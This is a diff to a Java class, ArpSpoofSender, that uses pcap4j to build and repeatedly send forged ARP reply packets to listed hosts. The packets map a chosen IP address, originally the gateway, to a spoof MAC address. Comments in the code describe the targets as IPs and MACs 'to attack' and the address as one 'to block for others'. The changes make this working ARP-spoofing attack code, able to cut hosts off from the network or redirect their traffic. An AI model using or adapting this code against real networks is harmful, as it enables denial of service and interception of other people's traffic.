@@ -20,13 +20,20 @@ import java.util.stream.Collectors;
 public class ArpSpoofSender implements Runnable {
 
     private Map<InetAddress, MacAddress> ipMap; // list of ips and macAddress to block
-    private InetAddress gatewayIpAddress; // ip address of the gateway
-    private MacAddress spoofMacAddress; // macaddress to use as a spoof
+    private InetAddress IpAddress; // ip address to block for others
+    private MacAddress spoofMacAddress; // mac address to use as a spoof
     private PcapHandle sendHandle;
 
-    public ArpSpoofSender(Map<InetAddress, MacAddress> ipMap, InetAddress gatewayIpAddress, MacAddress spoofMacAddress, PcapHandle sendHandle) {
+    /**
+     *
+     * @param ipMap - Map to ips and macs to attack
+     * @param IpAddress - Ip addres to block for others
+     * @param spoofMacAddress - mac used to send fake arp reply packers
+     * @param sendHandle - pcap handle used to send packets
+     */
+    public ArpSpoofSender(Map<InetAddress, MacAddress> ipMap, InetAddress IpAddress, MacAddress spoofMacAddress, PcapHandle sendHandle) {
         this.ipMap = ipMap;
-        this.gatewayIpAddress = gatewayIpAddress;
+        this.IpAddress = IpAddress;
         this.spoofMacAddress = spoofMacAddress;
         this.sendHandle = sendHandle;
     }
@@ -49,12 +56,12 @@ public class ArpSpoofSender implements Runnable {
     /**
      * @param ip  destination ip address
      * @param mac destination mac address
-     * @throws Exception
+     * @throws Exception - any error
      */
 
     private void sendArpSppofPacket(InetAddress ip, MacAddress mac) throws Exception {
-
-        MacAddress randomMac = getRandomMac(mac);
+       // System.out.println( "attacking ip "+ ip+ "   "+ mac);
+        //MacAddress randomMac = getRandomMac(mac);
 
         ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
         arpBuilder
@@ -63,14 +70,14 @@ public class ArpSpoofSender implements Runnable {
                 .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                 .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                 .operation(ArpOperation.REPLY)
-                .srcHardwareAddr(randomMac)
-                .srcProtocolAddr(gatewayIpAddress)
+                .srcHardwareAddr(spoofMacAddress)
+                .srcProtocolAddr(IpAddress)
                 .dstHardwareAddr(mac)
                 .dstProtocolAddr(ip);
 
         EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
         etherBuilder.dstAddr(mac)
-                .srcAddr(randomMac)
+                .srcAddr(spoofMacAddress)
                 .type(EtherType.ARP)
                 .payloadBuilder(arpBuilder)
                 .paddingAtBuild(true);
@@ -94,7 +101,6 @@ public class ArpSpoofSender implements Runnable {
                     .stream()
                     .map((entry) -> entry.getValue())
                     .collect(Collectors.toList());
-
 
             while (true) {
                 int number = (int) ((Math.random() * 10) % macs.size());
